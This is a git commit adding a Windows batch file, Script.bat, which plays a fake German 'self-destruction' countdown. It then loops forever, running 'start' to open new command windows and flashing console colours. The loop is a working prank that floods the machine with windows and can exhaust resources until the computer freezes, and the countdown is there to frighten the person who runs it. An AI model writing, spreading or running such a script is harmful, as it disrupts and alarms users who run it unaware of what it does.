de87f36f0ee79135bb2aa1b03a1ebced4a868a79
Lionhacker270411 <159521815+Lionhacker270411@users.noreply.github.com>
2024-06-04 13:25:53 +0200

    Script.bat

---
+++ Script.bat
@@ -0,0 +1,52 @@
+@echo off
+color 4
+title Selbstzerstoerung
+echo selbstzerstoerung in 10 sekunden
+timeout /t 3 /nobreak >nul
+cls
+echo 10
+timeout /t 1 /nobreak >nul
+cls
+echo 9
+timeout /t 1 /nobreak >nul
+cls
+echo 8
+timeout /t 1 /nobreak >nul
+cls
+echo 7
+timeout /t 1 /nobreak >nul
+cls
+echo 6
+timeout /t 1 /nobreak >nul
+cls
+echo 5
+timeout /t 1 /nobreak >nul
+cls
+echo 4
+timeout /t 1 /nobreak >nul
+cls
+echo 3
+timeout /t 1 /nobreak >nul
+cls
+echo 2
+timeout /t 1 /nobreak >nul
+cls
+echo 1
+timeout /t 1 /nobreak >nul
+cls
+:loop
+start
+color 37
+color 39
+color 28
+color 17
+color 12
+color 19
+color 29
+color 19
+color 04
+color 18
+color 28
+start
+goto loop
+pause
